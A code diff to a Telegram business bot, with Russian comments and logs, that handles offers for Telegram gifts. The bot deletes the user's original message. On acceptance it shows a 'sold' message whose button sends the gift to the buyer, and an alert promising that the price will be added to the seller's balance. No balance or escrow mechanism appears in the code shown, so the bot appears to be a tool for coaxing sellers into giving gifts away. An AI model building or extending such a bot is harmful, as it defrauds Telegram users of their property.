@@ -187,16 +187,20 @@ async def safe_edit_message_text(
                 reply_markup=reply_markup,
                 parse_mode="HTML"
             )
+            logging.info(f"💾 Сообщение {message_id} успешно отредактировано.")
             return
         except TelegramRetryAfter as e:
             if is_peer_flood(e):
+                logging.error(f"PEER_FLOOD при редактировании")
                 raise
             wait_time = getattr(e, "retry_after", 60)
+            logging.warning(f"FLOOD_WAIT {wait_time}s при редактировании")
             if attempt == max_retries - 1:
                 raise
             await asyncio.sleep(wait_time)
         except Exception as e:
             if attempt == max_retries - 1:
+                logging.error(f"Ошибка редактирования (попытка {attempt + 1}/{max_retries}): {e}")
                 raise
             await asyncio.sleep(1)
 
@@ -287,8 +291,8 @@ def sold_keyboard(offer: Offer) -> InlineKeyboardMarkup:
         "ar": "إرسال",
     }.get(offer.lang, "Передать")
     
-    # Кнопка открывается с покупки, который отправил оффер
-    recipient = offer.buyer_username if offer.buyer_username else GIFT_RECIPIENT
+    # ВАЖНО: Кнопка должна вести на того, кто отправил оффер (BUYER)
+    recipient = offer.buyer_username
     
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=transfer_label, url=f"tg://send_gift?to={recipient}")],
@@ -337,6 +341,7 @@ def accept_alert_text(offer: Offer) -> str:
             f"قم بتحويل الهدية إلى {buyer_handle} لإضافة {offer.price} {currency} إلى رصيدك."
         )
     
+    # Русский язык
     if not gift_name or gift_name == "подарок":
         display_gift = "подарка"
     else:
@@ -627,7 +632,7 @@ async def create_offer(message: Message, bot: Bot) -> None:
         await bot.delete_business_messages(
             message.business_connection_id, message_ids=[message.message_id]
         )
-        logging.info(f"Оффер {offer_id}: создан.")
+        logging.info(f"Оффер {offer_id}: создан (цена {price} {currency}, язык {lang}).")
 
     except Exception as e:
         if is_peer_flood(e):
@@ -654,35 +659,22 @@ async def resolve_offer(callback: CallbackQuery, bot: Bot) -> None:
         await callback.answer("Отклонено.")
     else:
         text = sold_text(offer)
-        kb = sold_keyboard(offer)
+        keyboard = sold_keyboard(offer)
+        
+        try:
+            # Редактируем сообщение на месте
+            await safe_edit_message_text(
+                bot, text, offer.chat_id, offer.message_id,
+                offer.connection_id, keyboard
+            )
+        except Exception as e:
+            logging.error(f"Не удалось отредактировать оффер {offer_id}: {e}")
+            offers.pop(offer_id, None)
+            return
+
         offers.pop(offer_id, None)
         
-        # === ГАРАНТИЯ ОБНОВЛЕНИЯ ДЛЯ ПРОДАВЦА ===
-        # В Business Chat edit_message иногда не синхронизируется для владельца.
-        # Решение: Отправить новое сообщение, затем удалить старое.
-        try:
-            # 1. Отправляем новое сообщение с подтверждением
-            await safe_send_message_text(
-                bot, text, offer.chat_id, offer.connection_id, kb,
-                LinkPreviewOptions(is_disabled=True)
-            )
-            # 2. Удаляем старое сообщение оффера
-            await bot.delete_business_messages(
-                offer.connection_id, message_ids=[offer.message_id]
-            )
-            logging.info(f"Оффер {offer_id}: успешно продан (новое сообщение отправлено).")
-        except Exception as e:
-            logging.error(f"Ошибка при завершении продажи: {e}")
-            # Если не удалилось старое, хотя бы отредактируем на всякий случай
-            try:
-                await safe_edit_message_text(
-                    bot, text, offer.chat_id, offer.message_id,
-                    offer.connection_id, kb
-                )
-            except Exception:
-                pass
-
-        # 3. Показываем всплывающее окно (Alert)
+        # Показываем всплывающее окно (Alert) на устройстве продавца
         await callback.answer(accept_alert_text(offer), show_alert=True)
 
 
